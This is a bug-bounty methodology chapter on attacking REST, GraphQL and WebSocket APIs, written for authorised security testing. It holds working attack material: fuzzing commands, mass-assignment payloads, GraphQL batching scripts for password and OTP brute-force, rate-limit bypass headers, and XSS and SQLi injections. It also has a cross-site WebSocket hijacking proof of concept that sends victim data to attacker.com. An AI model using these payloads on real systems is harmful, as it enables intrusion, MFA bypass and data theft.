---
icon: lucide/cog
tags:
  - api
  - rest
  - graphql
  - websockets
  - mass-assignment
  - bug-bounty
description: An API is the application's attack surface without the UI in the way. Everything from Parts 2–6 applies — the difference is in how you discover the surface and how authorization failures manifest.
---

# API Security: REST, GraphQL, WebSockets

An API is just the application's attack surface without the UI in the way. Everything from Parts 2–6 applies. The difference is in how you discover the surface and how authorization failures manifest. API-specific bugs tend to be more severe because APIs operate closer to the data layer, have less mature security tooling, and are often built by developers who consider the API "internal" even when it's public-facing.

---

<div class="grid cards" markdown>

-   :material-routes:{ .lg .middle } __7.1 REST Methodology__

    ---

    Endpoint discovery, versioning abuse, HTTP method tampering.

    [:octicons-arrow-right-24: REST](#71-rest-api-methodology)

-   :material-shield-lock-open:{ .lg .middle } __7.2 Authorization Flaws__

    ---

    BOLA, broken function-level auth, mass assignment, token swap testing.

    [:octicons-arrow-right-24: Authorization](#72-authorization-flaws-in-apis)

-   :simple-graphql:{ .lg .middle } __7.3 GraphQL__

    ---

    Introspection, field suggestion bypass, batching abuse, DoS, IDOR.

    [:octicons-arrow-right-24: GraphQL](#73-graphql)

-   :material-speedometer-slow:{ .lg .middle } __7.4 Rate Limiting__

    ---

    Detection, IP rotation bypass, reporting with real attack impact.

    [:octicons-arrow-right-24: Rate limits](#74-rate-limiting-and-resource-abuse)

-   :material-websocket:{ .lg .middle } __7.5 WebSockets__

    ---

    Auth bypass on upgrade, message tampering, CSWSH.

    [:octicons-arrow-right-24: WebSockets](#75-websockets)

-   :material-key-alert:{ .lg .middle } __7.6 API Key Leakage__

    ---

    Keys in responses, error bodies, headers. Validation and reporting.

    [:octicons-arrow-right-24: Key leakage](#76-api-key-and-secret-leakage)

</div>

---

## Decision Flow

```
API spec found (Swagger/OpenAPI)?
→ Import into Burp immediately. That spec is your complete endpoint list.

No spec available?
→ Kiterunner with Assetnote wordlists + JS file parsing.

API has versioned endpoints (/v2/)?
→ Always test /v1/, /v0/, /internal/, /beta/ — old versions frequently miss auth checks.

Found any endpoint?
→ Test all HTTP verbs. Authorization often differs per method.

API uses GraphQL?
→ Introspection first. If disabled, Clairvoyance. Then InQL for full mapping.

Any single-use or rate-limited action?
→ Batching bypass (GraphQL) or concurrent requests (REST).

API returns object IDs?
→ Identical IDOR methodology as Part 3. Test every verb independently.
```

---

## 7.1 REST API Methodology

### 7.1.1 Endpoint Discovery

Three layers — run them in order, each finds what the others miss.

=== "Layer 1 — API Specs"

    ```bash title="spec_locations.sh"
    # Check these on every target:
    /swagger.json          /swagger.yaml
    /api-docs              /api-docs.json
    /openapi.json          /openapi.yaml
    /v1/api-docs           /v2/api-docs
    /swagger-ui.html       /swagger-ui/
    /.well-known/openapi
    /docs                  /redoc
    /graphql               # → see 7.3

    # Postman collections (sometimes left public):
    # GitHub: org:targetcompany filename:*.postman_collection.json

    # Import spec into Burp:
    # Target → Import OpenAPI
    # Automatically populates all endpoints with parameters
    ```

=== "Layer 2 — Kiterunner"

    ```bash title="kiterunner_scan.sh"
    # Purpose-built for API route discovery — uses real API route wordlists

    # Basic scan:
    kr scan https://target.com/api/ \
      -w /opt/kiterunner/routes-large.kite \
      -o kiterunner_results.txt

    # With authentication:
    kr scan https://target.com/api/ \
      -w /opt/kiterunner/routes-large.kite \
      -H "Authorization: Bearer <token>" \
      -o kiterunner_auth.txt

    # Assetnote API wordlists (best available):
    kr scan https://target.com/ \
      -w /opt/wordlists/httparchive_apiroutes_2023_01_28.kite \
      -H "Authorization: Bearer <token>"
    # Output: endpoints returning non-404 responses with the method used
    ```

=== "Layer 3 — JS + Traffic"

    ```bash title="js_and_traffic.sh"
    # Extract API calls from downloaded JS files:
    grep -rhoE '"(/api/[^"]{3,50})"' ./js_files/ | tr -d '"' | sort -u > api_paths.txt

    # Burp traffic capture:
    # Browse entire app while authenticated
    # Target → Site map → filter path contains /api/
    # Export all observed endpoints
    # This gives real endpoints actually called by the frontend
    ```

---

### 7.1.2 API Versioning Abuse

**One of the most reliable API-specific techniques.** Old API versions (`v1`, `v0`) frequently have fewer security controls. Features may have been secured in v2 but the v1 endpoint was never removed.

```bash title="version_abuse.sh"
# If you find: GET /api/v2/users/me
# Also try:
GET /api/v1/users/me       # older version
GET /api/v0/users/me       # even older
GET /api/users/me          # unversioned
GET /api/beta/users/me     # beta channel
GET /api/internal/users/me # internal version
GET /api/admin/users/me    # admin version
GET /v1/users/me           # version at root
GET /api/2/users/me        # numeric only

# Version in header (some APIs):
GET /api/users/me
API-Version: 1
Accept: application/vnd.target.v1+json
```

**What to look for in older versions:**

| Finding | Impact |
|---|---|
| Missing authentication check | Unauthenticated data access |
| Missing authorization (IDOR on v1, blocked on v2) | Full IDOR on old version |
| More fields returned (PII stripped from v2) | Data exposure |
| No rate limiting | Brute-force vector |
| Admin functionality accessible | Privilege escalation |

---

### 7.1.3 HTTP Method Tampering

```bash title="method_tampering.sh"
# If GET /api/users/1043 exists, try all verbs:
OPTIONS /api/users/1043   # see allowed methods
HEAD    /api/users/1043   # headers without body (info leak)
POST    /api/users/1043   # create or update?
PUT     /api/users/1043   # full replacement
PATCH   /api/users/1043   # partial update
DELETE  /api/users/1043   # delete
TRACE   /api/users/1043   # reveals internal headers

# Method override headers (bypass WAF method restrictions):
POST /api/users/1043
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
# Or in body: _method=DELETE
```

**Common findings:**

```
DELETE on another user's resource → IDOR via method switch
PUT/PATCH with mass assignment → privilege escalation
Unauthenticated OPTIONS revealing sensitive internal headers
Authorization enforced on GET but not DELETE on same endpoint
```

---

## 7.2 Authorization Flaws in APIs

### 7.2.1 BOLA / IDOR — Per-Verb Testing

Full methodology in Part 3. API-specific addition: **test every HTTP verb independently**. Authorization is frequently enforced on GET but not on DELETE or PUT.

```bash title="per_verb_idor.sh"
# Account B's resource ID: 5523

GET    /api/documents/5523  →  403  (enforced)
DELETE /api/documents/5523  →  200  ← the finding
PUT    /api/documents/5523  →  200  ← also the finding

# Test all verbs on every object — don't stop at GET
```

---

### 7.2.2 Broken Function-Level Authorization

Low-privileged users calling high-privileged functions. In REST this manifests as a regular user calling admin endpoints.

```bash title="admin_endpoint_fuzz.sh"
# Fuzz for admin API routes with a regular user token:
ffuf -u https://target.com/api/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/api-endpoints.txt \
  -H "Authorization: Bearer <regular_user_token>" \
  -mc 200,201,400 \
  -o admin_api_endpoints.txt
# 400 = endpoint exists but bad parameters — NOT a 404

# Kiterunner with regular user token:
kr scan https://target.com/api/ \
  -w /opt/kiterunner/routes-large.kite \
  -H "Authorization: Bearer <regular_user_token>"
```

**Manual patterns to test with a regular user token:**

```bash title="manual_admin_tests.sh"
GET  /api/admin/users          # list all users
POST /api/admin/users/1043/ban # ban a user
GET  /api/admin/stats          # platform statistics
POST /api/admin/config         # modify configuration
GET  /api/internal/debug       # debug information
POST /api/users/1043/elevate   # elevate to admin
DELETE /api/users/1043         # delete any user
```

---

### 7.2.3 Mass Assignment

The API framework automatically maps request body parameters to object properties. If a privileged field (`role`, `is_admin`, `plan`) isn't explicitly excluded from binding, sending it in a normal request may set it.

```bash title="mass_assignment.sh"
# Normal user update:
PUT /api/users/me
{"display_name": "John", "bio": "Developer"}

# Mass assignment attempt — add every privileged field:
PUT /api/users/me
{
  "display_name": "John",
  "bio": "Developer",
  "role": "admin",
  "is_admin": true,
  "plan": "enterprise",
  "subscription": "premium",
  "verified": true,
  "email_verified": true,
  "credits": 99999,
  "balance": 99999,
  "org_role": "owner",
  "permissions": ["read","write","admin","delete"]
}

# Also test at registration:
POST /api/users/register
{
  "email": "test@test.com",
  "password": "password123",
  "role": "admin"       ← not in the signup form
}
```

**Finding undocumented writable fields:**

```bash title="find_writable_fields.sh"
# 1. GET /api/users/me → what fields does the response contain?
#    Those same fields may be writable via PUT/PATCH

# 2. Compare admin user response to regular user response
#    Extra fields in admin response → try setting them via regular user PATCH

# 3. Automated parameter discovery:
arjun -u https://target.com/api/users/me -m PUT \
  -H "Authorization: Bearer <token>"
```

---

### 7.2.4 Token Privilege Testing

```bash title="token_swap.sh"
# Setup:
# Token A: regular user (low privilege)
# Token B: admin or another regular user

# Burp Match & Replace for continuous testing:
# Proxy → Options → Match and Replace
# Replace: "Authorization: Bearer <token_B>" → "Authorization: Bearer <token_A>"
# Browse app as Token B → all requests auto-replayed as Token A

# What to look for:
# Same response body → authorization not enforced → IDOR/BFLA finding
# Smaller response but still 200 → partial data leak
# 403/401 → properly enforced (expected)
# 500 error → different code path triggered → worth investigating
```

---

## 7.3 GraphQL

GraphQL lets clients specify exactly what data they want. This flexibility creates a different attack surface: the entire schema is queryable if introspection is enabled, and authorization may not be enforced at the field level.

### 7.3.1 Introspection — Full Schema Enumeration

```bash title="introspection_query.sh"
# Full schema dump:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"}' | jq .

# Just list all type names:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}' | \
  jq '.data.__schema.types[].name'

# List all queries and mutations:
curl -s -X POST https://target.com/graphql \
  -d '{"query": "{ __schema { queryType { fields { name description } } mutationType { fields { name description } } } }"}' | jq .
```

!!! tip "InQL (BApp)"
    Install InQL from BApp Store → enter GraphQL endpoint → click Analyze. Generates full schema map, shows all queries/mutations with fields, and lets you open any operation directly in Repeater pre-built. Faster than manual introspection.

!!! tip "GraphQL Voyager"
    Feed your introspection JSON to [graphql-kit.com/graphql-voyager](https://graphql-kit.com/graphql-voyager/) for a visual relationship diagram. Useful for spotting unexpected connections between types.

---

### 7.3.2 Introspection Disabled — Field Suggestion Bypass

When introspection is disabled, GraphQL still returns field suggestions when you query a non-existent field. This leaks actual field names — effectively bypassing the disable.

```bash title="field_suggestion_bypass.sh"
# Query a non-existent field:
{"query": "{ user { xyz } }"}

# Response reveals real fields:
# "Did you mean 'email', 'password_hash', 'ssn', 'credit_card'?"
# ← The error message just leaked the schema

# Clairvoyance — automates field discovery via suggestions:
python3 clairvoyance.py \
  -u https://target.com/graphql \
  -H "Authorization: Bearer <token>" \
  -o schema.json
```

---

### 7.3.3 Batching — Rate Limit Bypass

GraphQL allows multiple operations in a single HTTP request. If rate limiting is applied per HTTP request rather than per operation, batching lets you send 1,000 operations in one request.

```bash title="graphql_batching.sh"
# 100 login attempts in one HTTP request:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(email: \"admin@target.com\", password: \"pass1\") { token } }"},
    {"query": "mutation { login(email: \"admin@target.com\", password: \"pass2\") { token } }"},
    {"query": "mutation { login(email: \"admin@target.com\", password: \"pass3\") { token } }"}
  ]'
```

```python title="batch_otp_bruteforce.py"
# OTP brute-force via batching — 1000 codes in one request:
import json

ops = [
    {
        'query': f'mutation {{ verifyOTP(code: "{str(i).zfill(6)}") {{ success }} }}'
    }
    for i in range(1000)
]
print(json.dumps(ops))

# Then:
# curl -X POST https://target.com/graphql -d @batch_otp.json | \
#   jq '.[] | select(.data.verifyOTP.success == true)'
```

---

### 7.3.4 Nested Query DoS

If the schema allows recursive types (a `User` has `friends` which returns `[User]` which has `friends`...), deeply nested queries cause exponential database load.

```bash title="nested_query_dos.sh"
# Find recursive types in schema first
# Look for: type A has field of type B, type B has field of type A

# Test with a shallow nest first (2-3 levels max on production):
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { friends { friends { friends { id email } } } } }"}'

# Measure response time — >5 seconds at 3 levels = significant DoS potential
# Report: confirm with a shallow query, note the depth at which delay becomes significant
# DO NOT send deeply nested queries repeatedly on production
```

```bash title="graphql_cop.sh"
# graphql-cop — automated audit:
python3 graphql-cop.py -t https://target.com/graphql \
  -H "Authorization: Bearer <token>"
```

---

### 7.3.5 IDOR in GraphQL

```bash title="graphql_idor.sh"
# Decode base64 IDs:
echo "VXNlcjoxMjM=" | base64 -d   # → User:123

# Re-encode as a different user:
echo -n "User:124" | base64        # → VXNlcjoxMjQ=

# Query another user's data:
{"query": "{ user(id: \"VXNlcjoxMjQ=\") { email ssn adminNotes } }"}

# Mutation IDOR — modify another user:
{"query": "mutation { updateUser(id: \"VXNlcjoxMjQ=\", email: \"x@x.com\") { success } }"}

# Field-level authorization:
# Request admin-only fields as regular user:
{"query": "{ user(id: \"<your_id>\") { email adminNotes internalId creditCard } }"}
# Are admin-only fields returned for regular users?
```

---

### 7.3.6 GraphQL Checklist

```
□ Introspection query → full schema dump
□ Introspection disabled → Clairvoyance field suggestion bypass
□ Import schema into InQL → review all queries and mutations in Repeater
□ Batching enabled → OTP/password brute-force in single request
□ Recursive types → nested DoS (≤3 levels max on production)
□ IDOR: decode base64 IDs, increment, test from different account
□ Mutations: test all mutations as regular user (unauthorized operations?)
□ Field-level auth: request admin-only fields as regular user
□ Authorization per operation vs. per field — field resolvers often unprotected
```

---

## 7.4 Rate Limiting and Resource Abuse

### 7.4.1 Detection and Bypass

**Where rate limiting matters most:**

```
High priority (missing = Medium–High):
  POST /api/login              → password brute-force
  POST /api/verify-otp         → OTP brute-force
  POST /api/forgot-password    → user enumeration + spam

Medium priority:
  POST /api/transfer           → rapid financial operations
  POST /api/invite             → invitation spam
  POST /api/export             → mass data exfil
```

```bash title="rate_limit_test.sh"
# Send 50 rapid requests:
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/login \
    -d "email=test@test.com&password=wrong$i"
done
# All 200s → no rate limiting
# 429 after N → rate limited at N — note the threshold

# ffuf with rate measurement:
ffuf -u https://target.com/api/login \
  -X POST \
  -d "email=admin@target.com&password=FUZZ" \
  -w /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 200 -rate 10
```

**Rate limit bypass via IP rotation headers:**

```bash title="rate_limit_bypass.sh"
# Rotate these headers — if server trusts them, each request looks like a new IP:
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.5
X-Originating-IP: 1.2.3.6
X-Remote-IP: 1.2.3.7
X-Client-IP: 1.2.3.8

# Burp Intruder: add X-Forwarded-For as second payload position
# Number list 1–1000 → effectively rotates IP per request
```

---

### 7.4.2 Reporting Rate Limits Correctly

!!! warning "Standalone missing rate limit = Low/Informational"
    The finding needs to show a real attack path. "An attacker can send many requests" gets rejected. "An attacker can brute-force all 1,000,000 OTP combinations in under 3 minutes, bypassing MFA entirely" gets paid.

```
Good title: "Missing rate limiting on OTP verification allows MFA brute-force"
Bad title:  "Missing rate limiting on /api/search"

Good impact: "Without rate limiting, an attacker can submit all 1,000,000 possible
6-digit OTP combinations in under 3 minutes using Turbo Intruder, bypassing MFA
for any account with a known username."

Bad impact: "Without rate limiting, an attacker can send many requests."
```

---

## 7.5 WebSockets

### 7.5.1 Authentication Bypass on Upgrade

WebSocket connections are established via an HTTP upgrade. If authentication is only checked at the handshake and not on subsequent messages, authenticated state may be bypassed.

```python title="ws_unauth_test.py"
import websocket

# Attempt connection without auth token:
ws = websocket.create_connection('wss://target.com/ws')
ws.send('{"type": "subscribe", "channel": "admin_events"}')
print(ws.recv())
ws.close()
```

!!! tip "Burp WebSocket history"
    Proxy → WebSockets history. Review all messages for auth tokens, user IDs, sensitive data. Right-click any message to intercept and modify in real time.

---

### 7.5.2 Message Tampering and Injection

WebSocket messages are just data — the same injection classes from Parts 4 and 3 apply.

```bash title="ws_message_tamper.sh"
# Normal message:
{"type": "message", "to": "user_123", "content": "hello"}

# IDOR — change "to" field:
{"type": "message", "to": "user_456", "content": "hello"}

# Stored XSS via message content:
{"type": "message", "to": "user_123", "content": "<script>alert(1)</script>"}

# Privilege escalation via message type:
{"type": "admin_broadcast", "content": "system message"}
# Can regular users send admin message types?

# SQLi in search:
{"type": "search", "query": "test' AND SLEEP(3)-- -"}
```

---

### 7.5.3 Cross-Site WebSocket Hijacking (CSWSH)

WebSocket upgrade requests include cookies automatically. If the upgrade doesn't validate the `Origin` header, a malicious page can initiate a WebSocket connection riding the victim's session.

```bash title="cswsh_test.sh"
# Test: send upgrade with attacker origin:
curl -sv \
  -H "Origin: https://attacker.com" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  https://target.com/ws
# Handshake completes → Origin not validated → CSWSH possible
```

```html title="cswsh_poc.html"
<!-- Host at https://attacker.com/poc.html -->
<!-- Victim visits → their session data exfiltrated -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send('{"type":"get_user_data"}');
};
ws.onmessage = function(e) {
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

---

## 7.6 API Key and Secret Leakage

→ Core methodology in [1.3.3 (Secret Detection)](part-01-recon.md#33-secret-detection) and [1.4 (GitHub Recon)](part-01-recon.md#4-github--source-code-recon).

**API-specific additions:**

```bash title="api_key_in_responses.sh"
# Keys in your own response body:
GET /api/users/me
# Response: {"api_key": "sk-live-..."} → is this exposed to other users via IDOR?

# Keys in error responses:
# Trigger a 500 with malformed input:
curl -s -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"broken": [[[}'
# Does error response include config data, tokens, or keys?

# Keys in response headers:
# Check for: X-API-Key, X-Auth-Token, X-Internal-Token in any response

# Validate found keys:
curl -H "Authorization: Bearer <found_key>" https://target.com/api/me
aws sts get-caller-identity  # for AWS keys
# Report: key is valid + what it grants access to
```

---

## Part 7 Complete Checklist

??? note "Expand full checklist"

    ```
    DISCOVERY
    □ Check all spec locations: /swagger.json, /openapi.yaml, /api-docs
    □ Kiterunner scan with Assetnote wordlists
    □ JS file parsing for API paths (→ Part 1)
    □ Burp site map filtered to /api/ after full manual browse

    VERSIONING
    □ Every endpoint: test v0, v1, /internal, /beta, /admin variants
    □ Version in header: API-Version: 1
    □ Older versions: missing auth? missing authz? more fields returned?

    HTTP METHODS
    □ OPTIONS on every endpoint → what methods are allowed?
    □ Test all methods on every endpoint: GET, POST, PUT, PATCH, DELETE
    □ Method override headers: X-HTTP-Method-Override: DELETE
    □ Each method tested independently for authorization

    AUTHORIZATION
    □ Every endpoint with Token A after observing with Token B
    □ Admin endpoints: fuzz with regular user token (Kiterunner)
    □ Mass assignment: add role/admin/plan to every PUT/PATCH body
    □ Fuzz parameter names on PUT/PATCH (Arjun, ParamMiner)

    GRAPHQL
    □ Introspection query → full schema dump
    □ Introspection disabled → Clairvoyance field suggestion bypass
    □ InQL import → review all queries and mutations
    □ Batching enabled → OTP/auth brute-force in single request
    □ Recursive types → nested DoS (≤3 levels)
    □ IDOR: decode base64 IDs, test from different account
    □ Field-level authorization: request admin fields as regular user

    RATE LIMITING
    □ Auth endpoints: 50 rapid requests → 429 at some point?
    □ Rate limit bypass: X-Forwarded-For rotation
    □ GraphQL batching as rate limit bypass
    □ Report only with demonstrated attack (OTP brute-force, not "many requests")

    WEBSOCKETS
    □ Burp WS history: review all messages for sensitive data
    □ Upgrade without auth token → still connects?
    □ Origin header validated on upgrade?
    □ Message field tampering: user IDs, message types, injection
    □ CSWSH PoC if Origin not validated

    API KEYS
    □ Keys in response body (own user response, IDOR to others)
    □ Keys in error responses (trigger 500 with malformed input)
    □ Keys in response headers
    □ GitHub dorking for target's API keys (→ Part 1)
    □ JS file secret scanning (→ Part 1)
    ```

---

## References

<div class="grid cards" markdown>

-   :simple-portswigger: __PortSwigger Labs__

    ---

    - [GraphQL API vulnerabilities](https://portswigger.net/web-security/graphql)
    - [WebSockets](https://portswigger.net/web-security/websockets)
    - [CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)

-   :octicons-tools-16: __Tools__

    ---

    - [Kiterunner](https://github.com/assetnote/kiterunner)
    - [InQL (BApp Store)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
    - [Clairvoyance](https://github.com/nikitastupin/clairvoyance)
    - [graphql-cop](https://github.com/nicholaswasher/graphql-cop)
    - [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/)

-   :octicons-book-16: __References__

    ---

    - [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
    - [Assetnote API wordlists](https://wordlists.assetnote.io)
    - [PayloadsAllTheThings — GraphQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
    - [HackTricks — GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)

</div>